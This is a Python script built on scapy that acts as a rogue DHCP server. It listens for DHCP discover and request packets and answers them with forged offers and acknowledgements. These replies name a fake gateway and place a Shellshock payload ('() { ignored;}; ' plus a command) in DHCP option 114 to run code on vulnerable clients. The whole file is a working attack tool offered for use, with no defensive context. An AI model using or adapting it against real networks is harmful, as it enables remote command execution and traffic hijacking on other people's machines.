#! /usr/bin/python

import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import *
import platform
import binascii
import time
import sys
import os


# Global variables
Command = "Sha2ow"
Time = time.asctime(time.localtime(time.time()))

# Terminal interface
def Terminal():
    if "Linux" not in platform.platform():
        print "[-] Sorry, this script only work on linux platform :("
        sys.exit()
    else:
        os.system("clear")
        Print_banner()


# Banner
def Print_banner():
    print """
 ____  ____  _   _  ____ ____
|  _ \|  _ \| | | |/ ___|  _ \ _ __  _   _
| |_) | | | | |_| | |   | |_) | '_ \| | | |
|  _ <| |_| |  _  | |___|  __/| |_) | |_| |
|_| \_\____/|_| |_|\____|_| (_) .__/ \__, |
                              |_|    |___/  Coded by: Sha2ow_M4st3r"""



# Sniffing packets
def Sniff_packets():
    print "[+] Sniffing all DHCP packets..."
    try:
        sniff(filter="udp and port 67 or 68", iface=sys.argv[1], prn=DHCP_analyzer)
    except KeyboardInterrupt:
        print "[-] Script stoped, You press the CTRL+C"
        print "[+] Now Time:", Time
        sys.exit()
    except:
        print "[-] Sniffing faield"
        sys.exit()



# Extract packets
def DHCP_analyzer(PACKETS):
    # Checking DHCP packet
    if PACKETS.haslayer(DHCP):
        # Getting victime mac address
        Victime_MAC = PACKETS[Ether].src
        Victime_MAC_Byte = binascii.unhexlify(Victime_MAC.replace(":","")) # Converting

        # Checking DHCP discover packet
        if PACKETS[DHCP].options[0][1] == 1:
            ID = PACKETS[BOOTP].xid
            print "[+] Receiving DHCP discover packet from", PACKETS[IP].src, "(", Victime_MAC, ")"
            DHCP_OFFER(Victime_MAC_Byte, ID)

        # Checking DHCP request packet
        if PACKETS[DHCP].options[0][1] == 3:
            ID = PACKETS[BOOTP].xid
            print "[+] Receiving DHCP request packet from", PACKETS[IP].src, "(", Victime_MAC, ")"
            DHCP_ACK(Victime_MAC_Byte, ID)

    else:
        print "[-] Can't find any dhcp packet"
        print "[#] Try again for sniffing..."
        Sniff_packets()


# Create fake DHCP OFFER packet
def DHCP_OFFER(MAC_ADDR, ID):
    OFFER = (Ether(src=get_if_hwaddr(sys.argv[1]), dst='ff:ff:ff:ff:ff:ff') /
	IP(src="192.168.1.1", dst='255.255.255.255') /
	UDP(sport=67, dport=68) /
	BOOTP(op='BOOTREPLY', chaddr=MAC_ADDR, yiaddr='192.168.1.4', siaddr='192.168.1.1', xid=ID) /
	DHCP(options=[("message-type", "offer"),
		('server_id', '192.168.1.1'),
		('subnet_mask', '255.255.255.0'),
		('router', '192.168.1.10'),
		('lease_time', 172800),
		('renewal_time', 86400),
		('rebinding_time', 138240),
        "end"]))

    print "[+] Sending DHCP OFFER packet..."
    try:
        sendp(OFFER, iface="wlan0")
    except:
        print "[-] Failed to send DHCP OFFER packet"



# Create fake DHCP ACK packet
def DHCP_ACK(MAC_ADDR, ID):
    ACK = (Ether(src=get_if_hwaddr(sys.argv[1]), dst='ff:ff:ff:ff:ff:ff') /
	IP(src="192.168.1.1", dst='255.255.255.255') /
	UDP(sport=67, dport=68) /
	BOOTP(op='BOOTREPLY', chaddr=MAC_ADDR, yiaddr='192.168.1.4', siaddr='192.168.1.1', xid=ID) /
	DHCP(options=[("message-type", "ack"),
		('server_id', '192.168.1.1'),
		('subnet_mask', '255.255.255.0'),
		('router', '192.168.1.10'),
		('lease_time', 172800),
		('renewal_time', 86400),
		('rebinding_time', 138240),
		(114, "() { ignored;}; " + Command),
        "end"]))

    print "[+] Sending DHCP ACK packet..."
    try:
        sendp(ACK, iface=sys.argv[1])
    except:
        print "[-] Failed to send DHCP ACK packet"



# Using all functions
def Main():
    Terminal()
    Sniff_packets()

Main()
